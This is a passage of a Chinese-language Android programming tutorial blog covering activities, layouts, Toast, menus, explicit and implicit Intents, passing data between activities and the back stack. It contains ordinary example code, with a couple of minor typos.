class="string">"@+id/button_1"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:text</span>=<span class="string">"Button 1"</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中@+id/button_1表示添加一个button_1的id。随后layout_width指定了当前元素的宽度，layout_height指定当前元素的高度，android:text指定了元素中显示的文字内容。</p><p>重新回到FirstActivity，将onCreate()方法修改为如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.first_layout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在AndroidManifest文件中注册"><a href="#在AndroidManifest文件中注册" class="headerlink" title="在AndroidManifest文件中注册"></a>在AndroidManifest文件中注册</h3><p>实际上Android Studio已经自动帮我们注册了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".FirstActivity"</span>&gt;</span><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中.FirstActivity是com.example.activitytest.FirstActivity的缩写。因为外层的包已经指定了程序的包名是com.example.activitytest，所以可以直接使用这个缩写就行了。</p><p>另外，仅仅注册了活动，程序仍然是不能运行的，需要为程序配置主活动。即在activity标签内部加入<code>&lt;intent-filter&gt;</code>标签，并且加入<code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;</code>和<code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;</code>这两句声明即可。</p><p>除此之外，还可以使用android:label指定活动中标题栏的内容。需注意的是，给主活动指定的label不仅会成为标题栏中的内容，还会成为启动器(Launcher)中应用程序显示的名称。</p><p>最终代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".FirstActivity"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"This is FirstActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另外，<strong>如果应用程序中没有声明任何一个活动作为主活动，这个程序仍然是可以正常安装的，只是无法在启动器中看到或者打开这个程序。</strong></p><h3 id="在活动中使用Toast"><a href="#在活动中使用Toast" class="headerlink" title="在活动中使用Toast"></a>在活动中使用Toast</h3><p>Toast是Android系统提供的一种非常好的提醒方式，在程序中可以使用它将一些短小的信息通知给用户，这些信息会在一段时间后自动消失，并且不会占用任何屏幕空间。</p><p>首先再onCreate()方法中添加如下代码，使我们再点击按钮的时候弹出一个Toast：（注意设置下自动导包）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Button button1 = (Button) findViewById(R.id.button_1);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(FirstActivity.<span class="keyword">this</span>, <span class="string">"You clicked me!"</span>,</span><br><span class="line">                Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中，findViewById()方法用来获取到在布局文件中定义的元素；它返回的是一个View对象。</p><p>onClickListener()方法用来为按钮注册一个监听器，点击按钮时就会执行监听器中的onClick()方法。</p><p>Toast用法非常简单，通过静态方法makeText()创建出一个Toast对象后，调用show()即可显示出来。</p><p>makeText()的第一个参数为Context，即Toast要求的上下文，由于活动本身就是一个Context对象，因此这里直接传入FirstActivity.this即可。第二个参数是显示的文本内容。第三个参数是Toast显示的时长，有两个内置常量可选择：Toast.LENGTH_SHORT和Toast.LENGTH_LONG。</p><p>完成上面的代码修改后编译安装即可。</p><h3 id="在活动中使用menu"><a href="#在活动中使用menu" class="headerlink" title="在活动中使用menu"></a>在活动中使用menu</h3><p>在res目录下新建一个menu文件夹，右击res目录-&gt;New-&gt;Directory，输入文件夹名menu，点击OK。接着再这个文件夹下新建一个main的菜单文件，右击文件夹-&gt;New-&gt;Menu resource file，文件名输入main，点击OK完成创建。</p><p>然后再main.xml文件中输入如下代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;menu xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span><br><span class="line">&lt;item</span><br><span class="line">android:id=<span class="string">"@+id/add_item"</span></span><br><span class="line">android:title=<span class="string">"Add"</span> /&gt;</span><br><span class="line">&lt;item</span><br><span class="line">android:id=<span class="string">"@+id/remove_item"</span></span><br><span class="line">        android:title=<span class="string">"Remove"</span> /&gt;</span><br><span class="line">&lt;/menu&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;item&gt;</code>标签就是用来创建某一个菜单项，然后通过android:id给这个菜单指定一个唯一的标识符，android:title给这个菜单项指定一个名称。</p><p>然后重新回到FirstActivity中来重写onCreateOptionsMenu()方法，可以用快捷键ctrl+O。然后编写如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">    getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过getMenuInflater()方法可以获得MenuInflater对象，再调用它的inflate()方法就可以给当前活动创建菜单。inflate()接收两个参数，第一个参数用于指定通过哪个资源文件创建菜单，第二个参数用于指定菜单项将添加到哪一个Menu对象中，这里直接用onCreateOptionsMenu()方法传入的参数menu。然后返回true表示允许创建的菜单显示出来，如果返回了false，创建的菜单将无法显示。</p><p>然后就是在FirstActivity中重写onOptionsItemSelected()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(item.getItemId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.add_item:</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"You clicked Add"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"You clicked Remove"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译运行即可。</p><h3 id="销毁一个活动"><a href="#销毁一个活动" class="headerlink" title="销毁一个活动"></a>销毁一个活动</h3><p>Activity类提供了一个finish()方法用来销毁当前活动。</p><p>修改按钮监听器以销毁活动，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                        finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>这时点下按钮，当前的活动便会被销毁了。</p><h2 id="使用Intent在活动之间穿梭"><a href="#使用Intent在活动之间穿梭" class="headerlink" title="使用Intent在活动之间穿梭"></a>使用Intent在活动之间穿梭</h2><p>Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。</p><p>Intent大致可以分为两种：显示Intent和隐式Intent。</p><h3 id="使用显示Intent"><a href="#使用显示Intent" class="headerlink" title="使用显示Intent"></a>使用显示Intent</h3><p>首先创建一个空的Activity，命名为SecondActivity，并勾选Genrate Layout File，给布局文件起名为second_layout，但不要勾选Launcher Activity选项。</p><p>将second_layout.xml替换为如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button_2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button 2"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后SecondActivity中保持不变即可。</p><p>Intent有多个构造函数的重载，其中一个是Intent(Context packageContext, Class&lt;?&gt;cls)。这个构造函数接收两个参数，第一个参数Context要求提供一个启动活动的上下文，第二个参数Class则是指定想要启动的目标活动，通过这个构造函数就可以构造出Intent的意图。Activity类中提供了一个startActivity()方法，这个方法是专门用于启动活动的，它接收一个Intent参数。</p><p>修改FirstActivity中的按钮点击事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent inten = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样按下按钮后就可以切换到SecondActivity了，如果要返回上一个活动的话按下Back键就可以销毁当前活动，从而回到上一个活动了。</p><h3 id="使用隐式Intent"><a href="#使用隐式Intent" class="headerlink" title="使用隐式Intent"></a>使用隐式Intent</h3><p>相比于显示Intent，隐式Intent不明确指出想要启动哪个活动，而是指定了一系列更为抽象的action和category等信息，然后交由系统去分析这个Intent，并找出合适的活动去启动。</p><p>通过在<code>&lt;activity&gt;</code>标签下配置<code>&lt;intent-filter&gt;</code>的内容，可以指定当前活动能够响应的action和category：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".SecondActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;action&gt;</code>标签中指定了当前活动可以响应com.example.activitytest.ACTION_START这个action，而<code>&lt;category&gt;</code>则包含了一些附加信息，更精确地指明了当前活动能够响应的Intent中还可能带有category。只有<code>&lt;action&gt;</code>和<code>&lt;category&gt;</code>的内容同时能够匹配上Intent中指定的action和category时，这个活动才能响应该Intent。</p><p>修改按钮点击事件如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>因为设置了android.intent.category.DEFAULT，所以在调用startActivity()方法时会自动将这个category添加到Intent中。</p><p>可以通过修改如下代码来添加一个category：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">        intent.addCategory(<span class="string">"com.example.activitytest.MY_CATEGORY"</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同时别忘了在<code>&lt;intent-filter&gt;</code>标签中声明该可以响应这个目录：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.MY_CATEGORY"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="更多的隐式用法"><a href="#更多的隐式用法" class="headerlink" title="更多的隐式用法"></a>更多的隐式用法</h3><p>打开网页：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">"http://www.baidu.com"</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中，Intent.ACTION_VIEW是一个Android系统的内置动作，其常量值为android.intent.action.VIEW。然后通过Uri.parse()方法，将一个网址解析成Uri对象，再调用setData()方法把这个Uri对象传递进去。这样点击按钮后就会弹出浏览器了。</p><p><code>&lt;intent-filter&gt;</code>标签中可以再配置一个<code>&lt;data&gt;</code>标签，用于更精确地指定当前活动能够响应什么类型的数据。<code>&lt;data&gt;</code>标签中主要可以配置以下内容：</p><ul><li>android:scheme：用于指定数据的协议部分。</li><li>android:host：用于指定数据的主机名部分。</li><li>android:port：用于指定数据的端口部分。</li><li>android:path：用于指定主机名和端口之后的部分。</li><li>android:mimeType：用于指定可以处理的数据类型。</li></ul><p>只有<code>&lt;data&gt;</code>标签中指定的内容和Intent中携带的Data完全一致时，当前活动才能够响应该Intent。</p><p>创建ThirdActivity，并添加上button3。然后修改注册信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".ThirdActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重新编译运行，可以看到系统弹出一个列表（未设置默认程序的话），显示了目前能够响应这个Intent的所有程序。</p><p>除了http之外，还可以指定其他很多协议，比如geo的显示地理位置、tel表示拨打电话。</p><p>下面调用系统拨号界面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onClick(View v) &#123;</span><br><span class="line">        Intent intent &#x3D; new Intent(Intent.ACTION_DIAL);</span><br><span class="line">        intent.setData(Uri.parse(&quot;tel:10086&quot;));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="向下一个活动传递数据"><a href="#向下一个活动传递数据" class="headerlink" title="向下一个活动传递数据"></a>向下一个活动传递数据</h3><p>在启动活动时传递数据的思路很简单，Intent中提供了一系列putExtr()方法的重载，可以把我们想要传递的数据暂存在Intent中，启动了另一个活动后，只需要把这些数据再从Intent中取出就可以了。</p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        String data = <span class="string">"Hello SecondActivity."</span>;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        intent.putExtra(<span class="string">"extra_data"</span>, data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中extra_data是键，data是值。</p><p>然后我们在SecondActivity中将数据取出，并打印出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.second_layout);</span><br><span class="line">    Button button2 = (Button) findViewById(R.id.button_2);</span><br><span class="line">    Intent intent = getIntent();</span><br><span class="line">    String data = intent.getStringExtra(<span class="string">"extra_data"</span>);</span><br><span class="line">    Log.d(<span class="string">"SecondActivity"</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getStringExtra()方法中的String可以切换成相应的数据类型。</p><p>这样就可以在Logcat中看到我们发送的信息了。</p><h3 id="返回数据给上一个活动"><a href="#返回数据给上一个活动" class="headerlink" title="返回数据给上一个活动"></a>返回数据给上一个活动</h3><p>startActivityForResult()方法也是用于启动活动的，但这个方法期望在活动销毁的时候能够返回一个结果给上一个活动。</p><p>startActivityForResult()接收两个参数，第一个参数是Intent，第二个参数是请求码，用于在之后的回调中判断数据的来源。</p><p>修改button1如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>接下来给button2添加返回数据的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(<span class="string">"data_return"</span>, <span class="string">"Hello FirstActivity"</span>);</span><br><span class="line">        setResult(RESULT_OK, intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>setResult()方法用于向上一个活动返回数据。其第一个参数用于向上一个活动返回处理结果，一般只使用RESULT_OK或RESULT_CANCELED这两个值；第二个参数则把带有数据的Intent传递回去。</p><p>然后我们需要在FirstActivity中重写onActivityRsult()方法以得到返回数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">if</span>(resultCode == RESULT_OK)&#123;</span><br><span class="line">                String returnedData = data.getStringExtra(<span class="string">"data_return"</span>);</span><br><span class="line">                Log.d(<span class="string">"FirstActivity"</span>, returnedData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onActivityResult()方法一共有三个参数：第一个参数requestCode是我们启动活动时传入的请求码。第二个参数resultCode，即我们再返回数据时传入的处理结果。第三个参数data，即携带着返回数据的Intent方法。</p><p>这样就完成了向上一个活动传递数据的过程。</p><p>另外如果是通过按下Back键返回的，我们可以重写onBackPressed方法来解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.putExtra(<span class="string">"data_return"</span>, <span class="string">"I back FirstActivity"</span>);</span><br><span class="line">    setResult(RESULT_OK, intent);</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="活动的生命周期"><a href="#活动的生命周期" class="headerlink" title="活动的生命周期"></a>活动的生命周期</h2><h3 id="返回栈"><a href="#返回栈" class="headerlink" title="返回栈"></a>返回栈</h3><p>Andorid是使用任务(Task)来管理活动的，一个任务就是一组存放在栈里的活动的集合，这个栈也被称作返回栈。栈是一种后进先出的数据结构，在默认情况下，每当我们启动了一个新的活动，它会在返回栈中入栈，并处于栈顶位置。而每当我们按下Back键或调用finish()方法去销毁一个活动时，处于栈顶的活动就会出栈，这时前一个栈的活动就会重新处于栈顶的位置。系统总是会显示处于栈顶的活动给数据。</p><p><img src="./day2/1.png" alt=""></p><h3 